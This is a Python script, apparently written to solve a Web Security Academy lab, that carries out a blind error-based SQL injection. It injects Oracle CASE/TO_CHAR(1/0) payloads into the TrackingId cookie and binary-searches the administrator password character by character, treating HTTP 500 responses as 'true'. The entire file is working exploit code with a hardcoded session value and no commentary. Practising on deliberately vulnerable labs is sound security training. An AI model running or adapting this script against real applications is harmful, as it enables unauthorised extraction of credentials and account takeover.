import requests
url = "https://0af500e703b258d2c0d481b900680038.web-security-academy.net/"
guesses = '0123456789abcdefghijklmnopqrstuvwxyz'
pwd = ''
for i in range(20):
    min =0
    max = 35
    guess = 35//2
    while True:
        p = "xyz'||(SELECT CASE WHEN substr(password,{},1)>'{}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'".format(str(i+1),guesses[guess])
        cookies = {"session":"uY9rqMxpsit7X5kLLqg28uWUoDLk5ia7","TrackingId":p}
        r = requests.get(url,cookies=cookies)
        print(guesses[guess])
        if '500' in str(r):
            print("TRUE")
            min = guess
            guess = (max+min)//2
        else:
            p = "xyz'||(SELECT CASE WHEN substr(password,{},1)='{}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'".format(str(i+1),guesses[guess])
            cookies = {"session":"uY9rqMxpsit7X5kLLqg28uWUoDLk5ia7","TrackingId":p}
            r = requests.get(url,cookies=cookies)
            if '500' in str(r):
                print("FOUND",guesses[guess])
                pwd+=guesses[guess]
                break
            else:
                print("FALSE")
                max = guess
                guess = (max+min)//2
print(pwd)